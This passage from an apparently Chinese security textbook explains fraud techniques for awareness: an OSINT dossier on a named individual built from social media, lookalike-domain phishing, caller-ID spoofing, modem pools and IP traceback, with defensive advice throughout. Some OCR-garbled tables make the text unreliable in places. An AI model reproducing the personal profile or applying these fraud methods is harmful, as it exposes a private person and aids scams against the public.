![image](MinerU_markdown_Web安全基础教程_assets/image_0177_8ce485e17ce0.jpg)



图 15-4 基本信息


![image](MinerU_markdown_Web安全基础教程_assets/image_0178_1684be5c590e.jpg)



图 15-5 获取职业、爱好


![image](MinerU_markdown_Web安全基础教程_assets/image_0179_8a4b06a407d2.jpg)



图 15-6 获取学校信息


![image](MinerU_markdown_Web安全基础教程_assets/image_0180_a9f04e990fe8.jpg)



图 15-7 获取学校地理位置


如图 15-8～图 15-10 所示的几幅截图能得到更多的且令人震惊的信息。

生日：9月9日，姓名：宁文文，职业：学生研究生，家乡：山东济南商河县。身份证号码：3701261990****0820，中间的四位代表出生年月日中的月日，通过生日信息可以猜测。

![image](MinerU_markdown_Web安全基础教程_assets/image_0181_cc7bd858270d.jpg)



图 15-8 获取生日信息


![image](MinerU_markdown_Web安全基础教程_assets/image_0182_f8adde6426de.jpg)



图 15-9 获取部分身份证信息


![image](MinerU_markdown_Web安全基础教程_assets/image_0183_0244739f484b.jpg)



图 15-10 获取部分身份证信息


汇总得到的信息，如表 15-1 所示。


表 15-1 汇总得到的信息


<table><tr><td>姓名</td><td>性别</td><td>职业</td><td>学校</td><td>家乡</td><td>身份证号</td><td>其他信息</td></tr><tr><td>宁文文</td><td>女</td><td>学生,研究生</td><td>山东师范大学</td><td>山东省济南市商河县</td><td>3701261990****0820(翻看了其朋友圈发布的生日信息,可推测出身份证号上的月日信息,这里用*代替。)</td><td>男朋友姓名在上面的图片中</td></tr></table>

在校学生通常会使用人人网这个社交软件。通过人人网简单注册搜索该用户姓名，通过与朋友圈照片核对确定了其人人网资料，如图 15-11 所示。

<table><tr><td colspan="2">学校信息</td><td>感情状态</td></tr><tr><td>大学</td><td>山东女子学院-2010年-其它院系
山东财经大学-2013年-会计学院</td><td>恋爱中</td></tr><tr><td>高中</td><td>商河一中-2007年</td><td>基本信息</td></tr><tr><td>初中</td><td>商河实验中学-2004年</td><td>性别 女</td></tr><tr><td>小学</td><td>西关小学-1998年</td><td>生日 1991年7月27日</td></tr><tr><td colspan="3">喜欢</td></tr><tr><td>音乐</td><td>汪苏龙</td><td></td></tr><tr><td>爱好</td><td>海三看衣服·旅游·送衣服·送饰品店</td><td></td></tr><tr><td>电影</td><td>金陵十三校 想剧·我知女人心情剧·先恋33天 客剧</td><td></td></tr><tr><td>游戏</td><td>真球找谁天天爱消除</td><td></td></tr><tr><td>恒动</td><td>跑步·爬山</td><td></td></tr><tr><td>喜欢书籍</td><td>杜拉拉升职记</td><td></td></tr></table>


图 15-11 人人网信息


其中的籍贯信息与分析后得到的一样，身份证中的月日信息也跟推测的一样。

想必看到这里已经觉得不可思议了吧，相对于那些专门从事各种诈骗的人，他们可能会做得更细致，取得这些信息后可以冒充或编造一些事情来和其联系获得其信任。

第 15 章视频 15-1 是一个电影剪辑，其中包含了社会工程学的内容，请关注。

# 电信诈骗手段还原

## 16.1 钓鱼技术

## 1. 什么是钓鱼

钓鱼攻击是一种形象的比喻，主要手段是以欺骗性的电子邮件、手机短信和网站诱导受害者输入一些重要的敏感信息，例如，银行卡账号密码、个人身份证号码、邮箱账号密码及经常使用的社交账号密码。攻击者获取敏感信息后加以利用，可导致受害者财产受到损失，受害者的社交圈也可能成为攻击者的目标。

电信诈骗中，攻击者通常会利用一些已经在互联网中泄露或其他渠道获取的用户信息、手机号、邮箱等作为诈骗的目标，通过向这些目标发送已经伪装好的钓鱼网站网址，若目标用户安全意识差且不能及时识别这些被伪装过的URL和网站内容，点击之后很可能上当受骗。

钓鱼网站可伪装成网银登录页面，通过短信的方式诱导用户进入此页面，而这个页面的域名又会伪装得和真实网址域名相差无几，如中国银行的域名为 www.boc.cn，而钓鱼网站的域名就可能注册成为 www.b0c.cn。若不仔细核对，是看不出这两个域名中字母 o 变成了数字 0 的。钓鱼攻击的流程如图 16-1 所示。

![image](MinerU_markdown_Web安全基础教程_assets/image_0184_48ec4d71633d.jpg)



图 16-1 钓鱼攻击流程


## 2. 钓鱼诈骗案例

生活中可能会遇到手机被盗的问题。若 iPhone 手机丢失，出于保护隐私信息，失主会想到在 iCloud 锁定手机。当盗窃者不能解锁时，可能会利用钓鱼攻击的手段获取个人信息，而这种情况下，失主往往会收到一条类似如图 16-2 所示的钓鱼短信。

![image](MinerU_markdown_Web安全基础教程_assets/image_0185_b60bd882ad04.jpg)



图 16-2 钓鱼短信


短信中会提示失主的 iPhone 在地图上显示，进入查看，然后给出了一个网址，这样对失主而言简直是雪中送炭，若丢手机的失主看到这条短信一定会欣喜若狂地顺手打开这个网站，接着网站会进入登录页面，如图 16-3 所示。

![image](MinerU_markdown_Web安全基础教程_assets/image_0186_82c554ddd183.jpg)



图 16-3 钓鱼网站登录页


钓鱼网站为了拿到用户认真填写的登录密码，防止用户首次输入密码过快而造成密码输入错误的情况，在用户首次输入时会提示密码输入错误，当用户第二次登录输入密码，就会登录成功，所以失主在登录页面中输入自己的账号和密码时，网站会提示密码错误，尽管此时填写的密码是正确的，如图 16-4 和图 16-5 所示。

![image](MinerU_markdown_Web安全基础教程_assets/image_0187_d4091440f838.jpg)



图 16-4 第一次登录提示密码错误


![image](MinerU_markdown_Web安全基础教程_assets/image_0188_24310de2c3b4.jpg)



图 16-5 第二次输入密码成功登录


当失主登录成功以后，账号和密码就被钓鱼网站记录下来。攻击者利用获取的账号和密码在真实的 iCloud 官网登录后可解锁手机。如图 16-5 所示网站的域名为 www.110-lcloud.com，而真实 iCloud 的官网域名为 www.icloud.com，两者之间的差别在于多了 110，把 i 替换成了和它相似的字母 1，这是从域名上的伪装，达到欺骗受害者的效果，攻击者往往会模仿真实官网的网页内容，让人误以为真。

类似的案例还有伪造网银登录页面，网站提示用户获得了某活动的 1000 元奖金，登录即可领取；伪造 QQ 登录页面，软件提示好友给你发送了一张私密照片，要求登录后才能查看。钓鱼攻击演示请参见视频 16-1。

## 3. 防范钓鱼攻击

通过上述案例得知，钓鱼网站一般无法校验用户的输入是否正确。用户可故意输入两次错误密码看是否可登录成功。

辨识域名是否为官方网站。可在搜索引擎中搜索关键词，在搜索结果中，搜索引擎会

有 “官网” 的标注，请仔细核对打开的网址与官方域名是否一致，如图 16-6 所示。

![image](MinerU_markdown_Web安全基础教程_assets/image_0189_47f600059bab.jpg)



图 16-6 搜索结果标签识别官网


警惕未备案的网站。登录工业和信息化部网站进行备案信息查询，如图 16-7 所示。点击“公共查询→备案查询→备案信息查询”，输入网站信息即可查询是否有备案，查询地址为 http://www.miitbeian.gov.cn/publish/query/indexFirst.action。若为钓鱼网站，则无备案记录，如图 16-8 所示。

![image](MinerU_markdown_Web安全基础教程_assets/image_0190_f671e12501a1.jpg)



图 16-7 备案查询


![image](MinerU_markdown_Web安全基础教程_assets/image_0191_1fc2aa91cd9e.jpg)



图 16-8 钓鱼网站无备案记录


## 16.2 改号软件

随着信息技术的广泛应用和不断发展，我国信息通信诈骗案件的数量也随之增多，出现的诈骗手段和方式也层出不穷，一些不法分子利用网上改号软件冒充银行、公安、通信等部门实施电话诈骗的案件也时有发生，严重影响社会稳定和人民财产安全。

## 1. 改号软件技术

改号软件（Platform for any phone number displayed）即手机号码任意显示系统（Any display system phone number），是一种通过网络 IP 转换的服务功能，可以将发出短信、拨出电话的任意号码设置成指定号码。

## ○ 电话网络中的数据传输

主叫号码信息识别及传送，即呼叫身份传递，是指交换机将主叫用户的号码及呼叫时间、日期等信息传送给被叫用户。主叫号码信息识别服务功能的交换机与具有主叫号码显示服务功能的终端相配合来实现，在终端上可以显示主叫电话的号码、呼叫时间等信息并存储，以便被叫用户查询。

## ○ 电话号码显示

电话呼叫原理简易示意流程如下：

主叫→电话线路→终端交换机（主叫的网关/落地网关）→运营商骨干网络→终端交换机（被叫的网关）→电话线路→被叫

该流程可以简单概括为以下几点：

① 在计算机或智能手机上预装一个 VoIP 软件，预置该软件指向某非法落地网关。

② 该网关允许接收客户端发送指定主叫号码，并将此号码传递给被叫号码所属网关。

③ 拨打电话，即可随意伪造号码。由于从“源网关”处已经伪造了号码，所以不受特殊号码限制。

如图 16-9 所示为改号软件改号过程。

![image](MinerU_markdown_Web安全基础教程_assets/image_0192_f4ed4d9990f5.jpg)



图 16-9 改号软件改号过程


通过上述可得出以下结论：“落地网关”是诈骗分子通过网络改号软件进行改号的关键，诈骗分子是通过网络改号软件在落地网关上将号码更改为“公安”“司法机关”“银行”等号码。

## 2. 改号诈骗案例

近日，杨女士接到一个“快递员”的电话，称她从天津市红桥区寄往韩国的10张银行卡属于管制物品，被出入境的机关截获。“快递员”称，可能是其他人利用她的名义寄出，最好立即报警。随后，“快递员”帮忙转接到了天津红桥区公安局电话。一名“刘队长”告诉杨女士，她涉嫌一宗“跨国经济案件”，案件中的100万元是从她的银行卡中转出。

杨女士通过 022-114 确认，“刘队长”拨打来的电话号码跟 114 描述的天津红桥区公安局电话号码一样。为了案件保密，在没有外人的情况下接受核查，打开对方发来的网页，真的看到自己的通缉令。“刘队长”说案件已移交检察院，先是命令杨女士将自己的 30 万元转至指定银行账户，之后再交 70 万元，就可办理取保候审。

安全专家对此案件进行分析：首先，假冒快递员拨打诈骗电话。其次，利用网络改号软件模仿警方电话，骗取受害人信任。最后，利用钓鱼网址模仿“检察院”网页展示受害人被通缉，同时利用社会工程学原理获得受害人信任，然后以帮助洗脱罪名为由骗取受害人银行卡密码。

以上案件共利用改号软件、钓鱼网站等多个高科技手段，而这些都是普通市民难以辨别和判断诈骗的主要原因，但类似的诈骗案件也屡屡发生。

利用改号软件实施诈骗的模拟演示请见视频 16-2。

## 3. 警惕改号诈骗

电信诈骗的源头是获得了受害人的个人信息，有效保护个人信息可以从源头杜绝诈骗。建议用户不要随意扫描不可信的二维码，不参与网上问卷调查等，这些行为可能导致个人信息泄露。

不轻信陌生人“涉嫌洗钱”“网购退款”“邮包藏毒”等诈骗电话。0019等开头的号码系从境外打来的电话，此类电话危险性极大，用户需提高警惕。

在电信诈骗行为日益猖獗的情况下，广大用户应了解安全知识，加强安全防护，做到“安全软件要安装，系统账号要加强，日常操作要小心”，让不法分子没有实施诈骗的可乘之机。

## 16.3 猫池技术

## 1. 猫池

所谓 “猫池”（ModemPool），就是将相当数量的 Modem 使用特殊的拨号请求接入设备连接在一起，是一种扩充电话通信带宽和目标对象装备的别称，可以同步拨打和发送大批量的用户号码和短信。猫池设备（如图 16-10 和图 16-11 所示）通常有 8 口、16 口的，多的有 128 口的，可同时插 128 张手机卡。由软件通过发送 AT 指令控制模块实现发短信、拨打电话、上网产生流量等功能。一台计算机连接 2～4 台 “猫池”，一台 “猫池” 可插入多张 SIM 卡，电话卡日均可拨打 2000 次电话，一台计算机每日拨出的电话次数高达 20 万次。

![image](MinerU_markdown_Web安全基础教程_assets/image_0193_a8b7dcff48bb.jpg)



图 16-10 猫池设备


![image](MinerU_markdown_Web安全基础教程_assets/image_0194_101f141b922f.jpg)



图 16-11 猫池设备


## 2. 商业用途

猫池可以认为仅仅是基于电话的一种扩充装备，不去区分它上网或手机讯号收发效应。猫池使用电话的中继功能，即一个号码多条线路，广泛应用于具有多用户远程联网需求的单位，或需要向多用户提供电话拨号联网服务的单位，如邮电局、税务局、海关、银行、证券商、各类交易所、期货经纪公司、工商局、各类信息呼叫中心等。

## 3. 非法用途

## ○ 经销商养卡

经销商为了套取佣金，会从运营商处开一批卡，自己开卡使用，实际并未销售给最终用户。运营商为了检查卡是否实际销售，会查卡的状态，若经常关机就认为是虚假销售。为了对付运营商，经销商采取了此类手段。有时，运营商的基层分支机构为了对付 KPI 考核，也是这么做的。

## ○ 电信诈骗养卡

电信网络诈骗是常见技术手段且使用频率较高范围较广，包括伪基站、木马病毒、改号软件、猫池、钓鱼网站、诈骗 WIFI 和银行卡盗刷器等。其中，猫池的技术门槛相对较低，不仅能够实现集群发布，而且使用方便、成本低廉，已经成为电信诈骗者常用的诈骗用具。诈骗分子将事先准备好的大量 SIM 卡插进卡槽，随着卡槽上方的指示灯闪烁，猫池就可以自动地同时向多个手机发送短信或语音呼叫等。如图 16-12 所示为诈骗窝点的猫池设备。

![image](MinerU_markdown_Web安全基础教程_assets/image_0195_425c19b84977.jpg)



图 16-12 诈骗窝点猫池设备


## 4. 灰黑色产业链

互联网时代的补贴、红包、抽奖等手段频繁使用以增加用户量，也催生出一条特殊产业链。黑客、卡商、刷客捆绑成一个利益共同体，形成一支人数至少百万的黑产军团。

## ○ 刷客销赃

2015年10月底，电信旗下的翼支付在部分省份开展“新注册用户送10元到15元的抵用券”的活动。刷客找到专门提供手机卡的卡商，获得上万张手机号码卡；再找到作为黑客集散中心的软件平台，利用这些手机号批量操作，成功注册上万个翼支付新用户，如图 16-13 所示。

<table><tr><td>12011833</td><td>1605</td><td>00710</td><td>短信</td><td>【月支付】您正在尝试，您仅支付，验证码：5.51，守住“它”，这是我们。</td><td>2016-10-13 13:40:22</td></tr><tr><td>12011633</td><td>18C</td><td>00911</td><td>短信</td><td>【月支付】您您的账户送到1张面值10元的代金券，有效期至2016-10-27 23...</td><td>2016-10-12 23:51:39</td></tr><tr><td>12011833</td><td>18 1</td><td>00722</td><td>短信</td><td>【月支付】您您的账户送到1张面值10元的代金券，有效期至2016-10-28 23...</td><td>2016-10-13 13:55:59</td></tr><tr><td>12011633</td><td>16 4</td><td>00712</td><td>短信</td><td>【月支付】您您的账户送到1张面值10元的代金券，有效期至2016-10-28 23...</td><td>2016-10-13 13:55:26</td></tr><tr><td>12011533</td><td>18 4</td><td>00715</td><td>短信</td><td>【月支付】您您的账户送到1张面值10元的代金券，有效期至2016-10-29 23...</td><td>2016-10-13 13:54:55</td></tr><tr><td>12011833</td><td>18</td><td>00723</td><td>短信</td><td>【月支付】您您的账户送到1张面值10元的代金券，有效期至2016-10-28 23...</td><td>2016-10-13 13:54:33</td></tr><tr><td>12011833</td><td>18</td><td>00710</td><td>短信</td><td>【月支付】您您的账户送到1张面值10元的代金券，有效期至2016-10 23...</td><td>2016-10-13 13:53:49</td></tr><tr><td>12011633</td><td>LCCI</td><td>00917</td><td>短信</td><td>【月支付】您您的账户送到1张面值10元的代金券，有效期至2016-10-28 23...</td><td>2016-10-13 13:53:20</td></tr><tr><td>12011633</td><td>LCCS</td><td>00744</td><td>短信</td><td>【月支付】您您的账户送到1张面值10元的代金券，有效期至2016-10-28 23...</td><td>2016-10-13 13:52:34</td></tr><tr><td>12011833</td><td>LCCS</td><td>00748</td><td>短信</td><td>【月支付】您您的账户送到1张面值10元的代金券，有效期至2016-10-29 23...</td><td>2016-10-13 13:52:24</td></tr><tr><td>12011833</td><td>LCCS</td><td>00746</td><td>短信</td><td>【月支付】您您的账户送到1张面值10元的代金券，有效期至2016-10-29 23...</td><td>2016-10-13 13:54:52</td></tr><tr><td>12011833</td><td>LCCSI</td><td>00745</td><td>短信</td><td>【月支付】您您的账户送到1张面值10元的代金券，有效期至2016-10-28 23...</td><td>2016-10-13 13:54:29</td></tr><tr><td>12011633</td><td>LCCSI</td><td>00724</td><td>短信</td><td>【月支付】您您的账户送到1张面值9元的代金券，有效期至2016-10-28 23...</td><td>2016-10-13 13:54:42</td></tr><tr><td>12011833</td><td>LCCSI</td><td>0077</td><td>短信</td><td>【月支付】您您的账户送到1张面值9元的代金券，有效期至2016-10-28 23...</td><td>2016-10-13 13:54:43</td></tr><tr><td>12011633</td><td>LCCF</td><td>00749</td><td>短信</td><td>【月支付】您您的账户送到9元的代金券，有效期至2016-10-28 23...</td><td>2016-10-13 13:49:54</td></tr></table>


图 16-13 翼支付批量注册截图


每个新账户收到了一条短信，账户返利一张面值 10 元的代金券。完成刷号之后，不法分子再将这批号码低价出售给淘宝卖家，而淘宝卖家再出售给买家。

## ○ 卡商养卡

刷客的背后还有卡商。卡商 B 养了 2 万张卡，手机卡大多都来自各大运营商的代理商。代理商每个月有开卡任务要求，由 B 帮忙达成任务量。B 从代理商手里买卡，然后“养卡”。养卡需要专业设备，那就是“猫池”和“卡池”，猫池需要放在卡池中，联动操作，一套可养 500 张卡的设备。B 将卡池装上后，连接计算机，装上相应的软件，就可以利用手机卡批量注册。如图 16-14 所示，卡商 B 的工作室已初具规模。

![image](MinerU_markdown_Web安全基础教程_assets/image_0196_f064fef86499.jpg)



图16-14 卡商B的工作室已初具规模


## ○ 黑客集散地

在这条枝蔓盘结的产业链中，卡商做的只是体力活，还需要人来提供技术。有大量的黑客在幕后鼎力相助。黑客 C 会浏览各个平台的优惠活动、专营活动的漏洞。去年春节期间，钱宝网推出“新注册用户签到”活动，签到者会赠送抽奖机会，活动中奖概率极高。黑客 C 用自己的手机实际操作了一遍后，发现操作步骤并不复杂，就开发了一个小软件，

如图 16-15 所示。

![image](MinerU_markdown_Web安全基础教程_assets/image_0197_88e05804e6ad.jpg)



图 16-15 黑客 C 提供的钱宝软件


除了批量注册，签到和抽奖这些简单步骤，都可通过软件操作。黑客们开发的软件汇聚到一些大的软件平台。黑客将软件放在平台上，刷客和卡商便嗅利而来。一位刷客利用钱宝网的软件，注册数百个账号，每日抽奖，还在朋友圈晒出自己的战果，如图 16-16 所示。这些堆积如山的货物，大部分会以打折的价格再往外销售。

![image](MinerU_markdown_Web安全基础教程_assets/image_0198_f8f1a6489708.jpg)



图 16-16 刷客战果


## ○ 攻防大战

这条产业链，就此形成完整闭环。前端刷客们去搜集信息，寻找平台漏洞并消化赃物。中端卡商提供手机号并滋养卡。后端黑客编写软件，通过平台公开招商。黑产军团是互联网时代的产物，并在两个高潮中迅速崛起。

第一个高潮就是电商时代。注册就送优惠券、代金券、打折卡，刷客通过软件批量注册后获得奖品，再以打折的价格往外售卖，从中赚取差价。聚美优品曾推出一次“零元购”活动。活动开始后，正常的用户几乎无法挤进活动页面，礼品不到一个小时便被抢空。聚美优品 CEO 陈欧在微博中痛斥黑客攻击，称有黑客批量注册小号刷礼品，一个地址一千单。

第二次高潮是互联网金融的兴起。最早期，P2P 为了吸引用户，动辄赠送几十甚至上百的红包和代金券，最开始只需要绑定银行卡便可将钱取出来。黑客 C 从网络上购买大量银行卡，用软件完成绑卡操作，刷取红包和礼品。

此后，互联网平台开始注意到黑产大军的存在，不断加固堤坝。安全人员 D 想到利用“爬虫”技术将刷客号码从软件平台爬出来，加入黑名单中，平台再遇到这些号码可自动拦截，形成防御壁垒。

即便有这份黑名单，也无法一劳永逸。不断有号码被淘汰，同时有新的号码流入。因此，要对这些软件平台实时监控，需要随时更新黑名单。另外，通过制定一些规则杜绝大部分刷客。例如，批量注册的号码大多是连号，若在同一个IP、同一个时间段出现大批量连号，可能就是“高危区”，可进行拦截。

利用猫池模拟电信诈骗过程请见视频 16-3。

## 5. 总结

高收益同样也带来了高风险，身为奉公守法的公民和网络安全爱好者，要做的是了解这些常识，避免自己和周围的人遭受损失。

## IP 溯源技术及标准化

网络安全技术不断发展的同时，黑客攻击网络的技术也在不断发展。安全防护和黑客攻击之间的攻防对抗消耗掉一部分技术进步带来的益处。PC机的CPU核心数越来越多、主频越来越高、内存越来越大的同时，防病毒和防火墙的软件也在不断地变得越来越庞大，安全防护服务需要占用的计算机资源也越来越多，消耗了技术升级带来的益处，这种互相抵消的消耗很难看到一个尽头。

随着网络技术的飞速发展，越来越多的传统运作方式正在被低耗、开放、高效的分布式网络应用所替代，网络已经成为人们日常生活中不可缺少的一部分。但是，随之而来的基于网络的计算机攻击也愈演愈烈，尤其是 DDoS 攻击，攻击者利用网络的快速和广泛的互联性，使传统意义上的安全措施基本丧失作用，严重威胁着社会和国家的安全；而且网络攻击者大多使用伪造的 IP 地址，使被攻击者很难确定攻击的位置，从而不能实施有针对性的防护策略。

这些都使得逆向追踪攻击源的追踪技术成为网络主动防御体系中的重要一环，对于最小化攻击的当前效果、威慑潜在的网络攻击者都有着至关重要的作用。

## 17.1 网络攻击模型

精确定位攻击源并非易事，因为攻击者对远程计算机或网络进行攻击时，通常会采用伪造报文 IP 源地址和利用跳板机间接攻击等手段来隐藏自己的真实 IP 地址。互联网有许多存在安全漏洞或者提供代理服务的主机都可能被攻击者利用作为“跳板”对目标发动攻击，从受害主机上只能看到“跳板”的 IP 地址，而无法获得真实攻击者的 IP 地址。其攻击模型如图 17-1 所示。

![image](MinerU_markdown_Web安全基础教程_assets/image_0199_702315870401.jpg)



图 17-1 网络攻击模型


涉及的机器包括攻击者、受害者、跳板机、僵尸机、反射器等。

○ 攻击者（Attacker Host）：发起攻击的真正起点，追踪溯源希望发现的目标。

○ 被攻击者（Victim Host）：受到攻击的主机，攻击源追踪的起点。

○ 跳板机（StepPing Stone）：已经被攻击者控制，并作为其通信管道和隐藏身份的主机。

☐ 僵尸机（Zombie）：已经被攻击者控制，并被其用作发起攻击的主机。

- 反射器（Reflector）：未被攻击者直接控制，但在不知情的情况下参与了攻击。

其中，跳板机和僵尸机都是攻击者事先已经攻破的主机，统称它们为变换器，负责把攻击数据包做某种变换以掩盖攻击者的行踪。

## 17.2 追踪溯源技术

计算机网络追踪溯源是指确定网络攻击者身份或位置及其中间介质的过程。身份指攻击者名字、账号或与之有关系的类似信息；位置包括其地理位置、虚拟地址（如 IP 地址、MAC 地址等）。追踪溯源过程还能够提供其他辅助信息，例如，攻击路径和攻击时序等。网络管理者可使用追踪溯源技术定位真正的攻击源，以采取多种安全策略和手段，从源头抑制，防止网络攻击带来更大破坏，并记录攻击过程，为司法取证提供必要的信息支撑。在网络中应用追踪溯源技术，可以确定攻击源，制定实施针对性的防御策略；采取拦截、隔离等手段，减轻损害，保证网络平稳健康地运行；记录攻击过程，出现安全问题时提供依据与手段，具有可审查性；同时，准确的溯源能力将对网络攻击者或潜在攻击者产生极大的威慑力。

## 1. 追踪溯源的难点

由于当前的 TCP/IP 协议对 IP 包的源地址没有验证机制以及 Internet 基础设施的无状态性，使得想要追踪数据包的真实起点已不容易，而要查找那些通过多个跳板或反射器等实施攻击的真实源地址就更加困难。具体体现在以下几个方面：

（1）当前主要的网络通信协议（TCP/IP）中没有对传输信息进行加密认证的措施，使得各种 IP 地址伪造技术出现。这使得通过利用攻击数据包中源 IP 地址的追踪方法失效。

（2）Internet 已从原来单纯的专业用户网络变为各行各业都可以使用的大众化网络，其结构更为复杂，使攻击者能够利用网络的复杂性逃避追踪。

（3）各种网络基础和应用软件缺乏足够的安全考虑，攻击者通过俘获大量主机资源，发起间接攻击并隐藏自己。

（4）一些新技术在为用户带来好处的同时，也给追踪溯源带来了更大的障碍。虚拟专用网络（VPN）采用的 IP 隧道技术，使得无法获取数据报文的信息；网络服务供应商（ISP）采用的地址池和地址转换（NAT）技术，使得网络 IP 地址不再固定对应特定的用户；移动通信网络技术的出现更是给追踪溯源提出了实时性的要求，这些新技术的应用都使得网络追踪溯源变得更加困难。

（5）目前追踪溯源技术的实施还得不到法律保障，如追踪溯源技术中，提取IP报文信

息牵扯个人隐私。这些问题不是单靠技术手段所能解决的。

## 2. 追踪溯源技术分类

## ○ 主动询问类

主动询问类追踪溯源技术是通过主动询问数据流可能经过的所有路由器，确认其流向路径的机制（Input Debugging）。主动询问是一种比较粗糙的方法，通过带有 Input Debugging 功能的路由器进行一级一级（Hop-by-hop）的沿攻击数据流路径查询追踪，多数路由器具有查找符合某种模式报文的输入接口的调试功能，利用路由器的这一功能，在攻击发生后逐跳确定具有攻击特征的数据包来自哪个路由入口，通过反复使用从而可以确定发送攻击包的真实 IP。原理示意图如图 17-2 所示。

![image](MinerU_markdown_Web安全基础教程_assets/image_0200_e5c095f48923.jpg)



图 17-2 带有 Input Debugging 功能的路由器的追踪溯源原理


此类方法目前在计算机网络中已经得到应用，有不少的互联网服务提供商（ISP）通过设备升级改造，安装更加智能的路由器系统提高追踪效率及能力。

此类方法的缺点是要求追踪路径上所有路由器必须具有输入调试能力，且需要网络管理员或技术人员手工操作，依赖互联网服务提供商（ISP）的高度合作。虽然其追踪结果非常准确，但由于追踪速度很慢且操作复杂、技术含量高，除了军用等特殊需要外，基本不使用。

## ○ 数据监测类

数据监测类追踪溯源技术是通过构建覆盖全网络的监测点对网络中数据流进行监测，如利用日志记录技术（Logging）对流经路由器的所有数据包（包括攻击数据包）进行信息存储，一旦发生攻击，可以通过日志查询确定攻击路径。此方法需要大量的存储计算资源和大数据分析技术的支持，其原理如图 17-3 所示。

![image](MinerU_markdown_Web安全基础教程_assets/image_0201_6f0b17f88452.jpg)



图 17-3 数据检测类追踪溯源原理


另一种思路就是将数据包经过路径的路由器地址信息写入数据报文中，受害者收到攻击数据包后就可以从报文中提取出路径信息，构造出攻击数据的攻击路径，就可以追踪到攻击者，这就是路径记录法。在 IP 报文头的 IP 选项里有一项路径记录功能，可以用来记录报文从攻击者到受害者所经过的路径上的各路由器的口地址，路径记录法就是利用该功能来记录路径信息。

此类方法的优点是能够对单个数据包进行很准确的反向跟踪，漏警率为零，且有很好的互操作性。缺点是它需要 ISP 间的相互合作，对高速路由器存储要求高，并且会消耗路由器 CPU 资源，影响路由器的流量转发性能。

## ○ 路径重构类

路径重构类是目前研究得比较热的一类方法，也是追踪溯源技术发展的方向之一。其核心思想是通过在网络中传输的数据包中编入路径信息或者单独发送含有路径信息的数据包，接收端通过收集这些包含路径信息的数据包，并根据一定的路径重构算法实现重构攻击数据包路径的目的。

较为著名的有 PPM（Probabilistic Packet Marking）、iTrace、DPM（Deterministic Packet Marking）、APPM 标记法等，其原理如图 17-4 所示。

![image](MinerU_markdown_Web安全基础教程_assets/image_0202_586d81f4367f.jpg)



图 17-4 路径重构类追踪溯源原理


此类方法的优点是易于实现，与前面的方法相比，不需要 ISP 配合改造路由器或部署特殊设备，也不需要大量的人力物力等资源投入。但缺点是该方法虚警率较高，计算量很大，对 DDoS 攻击无效，且鲁棒性差。

## 3. 可控网域追踪溯源和非可控网域追踪溯源

当前各种网络追踪溯源技术的有效性都与网络及其网络运营商的密切配合相关，使用网络运营商提供的数据信息或者在其允许下部署相应溯源设备都能较好地完成追踪溯源。考虑到全球互联网空间，根据网络运营商的配合程度，可以将网络空间分为可控网域和非可控网域。

可控网域是指用户能够通过管理技术或行政命令等手段实施控制的网域，与之相反，非可控网域就是指用户不能用上述手段实施管理控制的网域。

## (1) 可控网域追踪溯源

考虑网络通信，终端 P1 产生网络数据 S，通过 R1→R2 等一系列中间介质传输到接收端 P2，如图 17-5 所示。协作网域追踪溯源问题可描述为，在一个可控的网域中，给定 S，如何确定 P1。

![image](MinerU_markdown_Web安全基础教程_assets/image_0203_c2c5ba1a12e4.jpg)



图 17-5 协作网域追踪溯源问题模型


由于追踪溯源在可控网域中，因此能够通过行政或网络管理等技术手段从网络提供商（ISP）那里获取网络拓扑、路由、IP 地址分配等信息，或者在其允许下部署相应设主动采集或标记网络路径信息。通过对这些信息数据的分析处理，还原数据传输信息，重构其路径，达到追踪溯源之目的，主要有主动询问类、数据监测类、路径重构类等技术方法。三类技术方法的原理之前已详细说明。

在可控网域中，与网络运营商协作配合，获取信息数据，改造网络设备，部署相应的溯源设备。通过分析处理能够满足网络追踪溯源要求，重构攻击路径，完成追踪溯源。在实际使用中采用何种协作网域溯源技术，则需要综合评估网络负载、ISP 配合与否等多种因素，如表 17-1 所示，择优选取。


表 17-1 协作网域追踪溯源技术比较表


<table><tr><td>技术类别</td><td>网络负载</td><td>路由负载</td><td>是否需要ISP支持</td><td>计算量</td><td>人力资源</td></tr><tr><td>主动询问类</td><td>低</td><td>高</td><td>需要</td><td>低</td><td>高</td></tr><tr><td>数据监测类</td><td>低</td><td>高</td><td>部署设备</td><td>中</td><td>中</td></tr><tr><td>路径重构类</td><td>低</td><td>低</td><td>部署设备</td><td>高</td><td>低</td></tr></table>

## (2) 非可控网域追踪溯源

从可控网域追踪溯源技术可以看到，网络追踪溯源的主旨思想是对网络数据信息进行记录分析，通过分析实现网络路径的重构。这些网络数据信息可从两个渠道获取：

① 与网络营运商协作，由其直接提供。

② 在网络营运商的许可下，部署相应设备，按需采集或记录信息。

显然，这些手段在可控网域中都能较为容易的实现，从而有效实施追踪溯源。然而，这些有用信息在非协作网域中却难以获得。

在全球互联网空间，不可能获得每个网域营运商的协作或者被允许部署设备，全球范围追踪溯源的实施受到极大限制。而另一方面，攻击者又总是能够在一个广泛的网络空间中发起大规模的网络攻击，通过第三方或非可控的网域发起攻击。由于各种因素（政治、安全等）限制，这些网域不提供任何信息，而导致追踪过程的中断，不能溯源定位真正的攻击源。

因此，要在非可控网域中有效实施追踪溯源，必先解决非可控网络的信息获取问题，以支撑非协作网域的追踪溯源。而基于网络信息主动感知的非协作追踪溯源技术通过对非可控网域的信息主动探知获取相应信息，在非可控网域的网络感知为追踪溯源模块提供信息支撑。例如，网络拓扑主动发现能够生成非可控网络的整体拓扑，从而可实施可控DoS技术追踪，或者有的放矢地采集监测数据流，分析网络链路信息等。

基于网络信息主动感知的非协作追踪溯源技术包含信息探知及溯源两方面的能力，主要功能模块包括网络感知、追踪溯源和策略管理。利用拓扑主动发现、网络扫描、渗透等网络主动感知技术在非协作网域中实施信息获取。追踪溯源模块对网络感知获取的信息进行分析处理，重构数据传输路径，并将分析结果与网络感知和策略管理模块进行交互，以调整相应系统运作策略和感知内容。网络感知、追踪溯源、策略管理三个功能模块是相互交织联动的统一体，通过持续不断的分析处理，重构非协作网域攻击数据流路径等信息，实现非可控网域的追踪溯源能力。

## 17.3 实战操作

本实战通过对一个真实攻击源 IP 的溯源分析来学习网络溯源分析的技巧。

○ 攻击源 IP: 120.25.65.5。

○ 攻击源 IP 的归属地: 该 IP 归属地浙江省杭州市, 阿里云 BGP 数据中心, 如图 17-6 所示。

使用工具：Hao1788 IP 地址查询（http://www.hao7188.com）。

![image](MinerU_markdown_Web安全基础教程_assets/image_0204_6ccb39243460.jpg)



图 17-6 攻击源 IP 归属地


○ 域名关联分析：共有 migelao.com、www.migelao.com 解析到该 IP，如图 17-7 所示。

